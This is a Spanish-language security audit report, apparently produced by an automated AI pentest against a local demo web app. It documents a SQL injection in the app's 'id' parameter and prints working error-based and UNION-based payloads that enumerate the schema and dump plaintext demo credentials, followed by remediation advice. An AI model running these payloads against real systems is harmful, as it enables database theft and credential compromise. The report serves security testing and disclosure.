# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:30:09 UTC  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection clásica (error-based + UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer la totalidad de la base de datos, incluyendo credenciales en texto plano de todos los usuarios registrados.

---

## Descripción del Objetivo

La aplicación web consiste en un formulario de búsqueda de usuarios que acepta un parámetro `id` vía método GET:

```
GET /?id=<valor>&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

---

## Vulnerabilidades Encontradas

### SQL Injection - Parámetro `id` (CRÍTICA)

**Tipo:** SQL Injection clásica (Error-Based + UNION-Based)  
**Parámetro vulnerable:** `id` (GET)  
**CVSS Score:** 9.8 (Crítico)  
**CWE:** CWE-89 - Improper Neutralization of Special Elements used in an SQL Command

#### Evidencia de vulnerabilidad

Al introducir una comilla simple `'` en el parámetro `id`, la aplicación expone un error SQL que revela:
- El motor de base de datos: **MariaDB**
- La ruta del fichero vulnerable: `/var/www/html/low.php`
- La estructura de la consulta SQL

**Payload de detección:**
```
GET /?id=1'&Submit=Submit
```

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right 
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

---

## Explotación

### Fase 1: Bypass de autenticación / Extracción de todos los registros

**Payload:**
```sql
1' OR '1'='1
```

**URL:**
```
GET /?id=1%27+OR+%271%27%3D%271&Submit=Submit
```

**Resultado:** Se obtuvieron todos los registros de la tabla users:
- John Doe
- Jane Smith
- Bob Johnson
- Alice Williams
- Charlie Brown
- Diana Davis
- Eve Miller
- Frank Wilson

---

### Fase 2: Determinación del número de columnas (UNION-Based)

**Payload:**
```sql
1' UNION SELECT NULL,NULL-- -
```

**Resultado:** 2 columnas confirmadas en la consulta original.

---

### Fase 3: Extracción de información del sistema

**Payload:**
```sql
1' UNION SELECT database(),version()-- -
```

**Resultado:**
| Campo | Valor |
|-------|-------|
| Base de datos actual | `sqli_demo` |
| Versión del servidor | `10.11.14-MariaDB-ubu2204` |

---

### Fase 4: Enumeración de tablas

**Payload:**
```sql
1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -
```

**Resultado:**
| Tabla | Base de datos |
|-------|---------------|
| `users` | `sqli_demo` |

---

### Fase 5: Enumeración de columnas

**Payload:**
```sql
1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -
```

**Columnas encontradas en tabla `users`:**
| Columna | Tipo |
|---------|------|
| `user_id` | int |
| `first_name` | varchar |
| `last_name` | varchar |
| `username` | varchar |
| `password` | varchar |
| `email` | varchar |

---

### Fase 6: Exfiltración de credenciales

**Payload:**
```sql
1' UNION SELECT username,password FROM sqli_demo.users-- -
```

**Credenciales extraídas (texto plano):**
| Usuario | Contraseña |
|---------|------------|
| `admin` | `password123` |
| `jsmith` | `secret456` |
| `bjohnson` | `mypass789` |
| `awilliams` | `qwerty123` |
| `cbrown` | `password` |
| `ddavis` | `secure123` |
| `emiller` | `hackme` |
| `fwilson` | `admin123` |

> ⚠️ **CRÍTICO:** Las contraseñas se almacenan en **texto plano** en la base de datos, lo que agrava significativamente el impacto de la vulnerabilidad.

---

## Análisis Técnico

El código vulnerable en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin ningún tipo de sanitización:

```php
// Código vulnerable (inferido)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

Esta construcción permite que un atacante cierre la cadena con `'` e inyecte SQL arbitrario.

---

## Impacto

| Aspecto | Descripción |
|---------|-------------|
| **Confidencialidad** | ALTO - Extracción completa de la base de datos incluyendo credenciales |
| **Integridad** | ALTO - Posibilidad de modificar/eliminar datos |
| **Disponibilidad** | MEDIO - Posibilidad de realizar ataques DoS vía consultas pesadas |
| **Alcance** | Acceso completo a la base de datos `sqli_demo` y potencialmente otras |

---

## Recomendaciones

### 1. Usar Consultas Parametrizadas (Prepared Statements) — PRIORITARIO
```php
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

### 2. Validar y sanitizar el input
```php
$id = intval($_GET['id']); // Para IDs numéricos
```

### 3. Cifrar las contraseñas
Utilizar funciones de hash seguras como `password_hash()` con bcrypt:
```php
$hash = password_hash($password, PASSWORD_BCRYPT);
```

### 4. Deshabilitar los mensajes de error en producción
```php
mysqli_report(MYSQLI_REPORT_OFF);
ini_set('display_errors', 0);
```

### 5. Principio de mínimo privilegio
El usuario de base de datos debe tener únicamente los permisos necesarios (solo SELECT en las tablas requeridas).

### 6. Implementar un WAF
Desplegar un Web Application Firewall para detectar y bloquear patrones de SQL Injection.

---

## Conclusión

La aplicación web presenta una vulnerabilidad crítica de SQL Injection que permite a un atacante no autenticado extraer la totalidad de la información de la base de datos, incluyendo credenciales de acceso en texto plano. Se recomienda remediar esta vulnerabilidad de forma inmediata mediante el uso de prepared statements y el cifrado adecuado de contraseñas.

---

*Informe generado automáticamente por análisis de seguridad automatizado*
